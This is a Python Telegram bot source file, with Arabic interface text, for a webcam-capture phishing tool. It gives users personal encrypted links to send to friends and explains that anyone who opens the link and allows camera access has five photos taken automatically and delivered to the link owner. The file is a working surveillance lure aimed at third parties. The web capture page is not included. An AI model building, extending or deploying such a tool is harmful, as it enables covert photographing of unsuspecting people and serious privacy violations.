import time
from datetime import datetime
import telebot
from config import TOKEN, DEVELOPER_CHAT_ID, BASE_URL, logger
from encryption import encrypt_id

bot = telebot.TeleBot(TOKEN)

# تخزين إحصائيات المستخدمين
user_stats = {}
total_photos_received = 0

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """رسالة الترحيب"""
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()

    encrypted = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?q={encrypted}"

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link))
    markup.add(
        telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help"),
        telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    )

    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة الاستخدام:*\n"
        f"1. انسخ الرابط أعلاه\n"
        f"2. أرسله لأصدقائك\n"
        f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
        f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"New user started: {user_name} (ID: {user_id})")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    """عرض الإحصائيات"""
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"🆔 رقمك: {user_id}\n"
            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
            f"📅 تاريخ التسجيل: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    """رسالة المساعدة"""
    help_text = (
        "📖 *دليل استخدام البوت*\n\n"
        "🎯 *الأوامر المتاحة:*\n"
        "✅ /start - الحصول على رابطك الشخصي\n"
        "📊 /stats - عرض إحصائياتك\n"
        "❓ /help - عرض هذه التعليمات\n\n"
        "🔧 *كيف يعمل البوت:*\n"
        "1. اضغط على /start للحصول على رابطك الشخصي\n"
        "2. أرسل الرابط لأصدقائك\n"
        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
        "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
        "⚠️ *ملاحظات هامة:*\n"
        "• البوت يأخذ 5 صور فقط ثم يتوقف\n"
        "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
        "• الصور تصل فقط لصاحب الرابط\n\n"
        "🛠️ للمساعدة التقنية: @khaled_developer"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """إرسال رسالة لجميع المستخدمين (للمطور فقط)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ استخدم:\n/broadcast نص الرسالة")
        return

    broadcast_text = parts[1]
    success, fail = 0, 0
    
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار:*\n\n{broadcast_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1)
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ تم البث!\n✓ {success} مستخدم\n✗ {fail} فشل")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    """معالجة الصور الواردة"""
    global total_photos_received
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    total_photos_received += 1

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 الرقم: {user_id}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}"
    )
    bot.reply_to(message, caption)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """معالجة الأزرار"""
    if call.data == "help":
        send_help(call.message)
    elif call.data == "stats":
        show_stats(call.message)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """معالجة الرسائل الأخرى"""
    if message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\nاستخدم /start للبدء")
    else:
        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\nاستخدم /start للحصول على رابطك")

def get_bot():
    """إرجاع كائن البوت والإحصائيات"""
    return bot, user_stats, total_photos_received
